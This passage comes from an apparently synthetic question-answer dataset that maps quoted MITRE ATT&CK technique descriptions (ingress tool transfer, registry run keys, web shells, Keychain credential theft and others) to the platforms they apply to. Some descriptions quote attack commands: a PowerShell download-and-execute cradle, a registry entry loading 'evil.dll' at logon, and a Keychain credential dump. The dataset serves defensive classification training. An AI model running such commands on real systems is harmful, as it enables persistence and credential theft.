      "question": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.\n\nAdversaries may manipulate a process PEB to evade defenses. For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.\n\nThis behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Hide Artifacts: Process Argument Spoofing (T1564.010);\nTechnique Hide Artifacts: Process Argument Spoofing (T1564.010) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.\n\nAdversaries may manipulate a process PEB to evade defenses. For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.\n\nThis behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.",
      "answer": "The provided description is related to MITRE technique Hide Artifacts: Process Argument Spoofing (T1564.010);\nTechnique Hide Artifacts: Process Argument Spoofing (T1564.010) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
      "answer": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.",
    "context": "",
    "output": "The provided description is related to MITRE technique Remote Services: SMB/Windows Admin Shares (T1021.002);\nTechnique Remote Services: SMB/Windows Admin Shares (T1021.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.",
      "answer": "The provided description is related to MITRE technique Remote Services: SMB/Windows Admin Shares (T1021.002);\nTechnique Remote Services: SMB/Windows Admin Shares (T1021.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
    "context": "",
    "output": "The provided description is related to MITRE technique Audio Capture (T1123);\nTechnique Audio Capture (T1123) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
      "answer": "The provided description is related to MITRE technique Audio Capture (T1123);\nTechnique Audio Capture (T1123) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Query Registry (T1012);\nTechnique Query Registry (T1012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "answer": "The provided description is related to MITRE technique Query Registry (T1012);\nTechnique Query Registry (T1012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).",
    "context": "",
    "output": "The provided description is related to MITRE technique Server Software Component: Web Shell (T1505.003);\nTechnique Server Software Component: Web Shell (T1505.003) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).",
      "answer": "The provided description is related to MITRE technique Server Software Component: Web Shell (T1505.003);\nTechnique Server Software Component: Web Shell (T1505.003) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.",
    "context": "",
    "output": "The provided description is related to MITRE technique Credentials from Password Stores: Keychain (T1555.001);\nTechnique Credentials from Password Stores: Keychain (T1555.001) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.",
      "answer": "The provided description is related to MITRE technique Credentials from Password Stores: Keychain (T1555.001);\nTechnique Credentials from Password Stores: Keychain (T1555.001) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
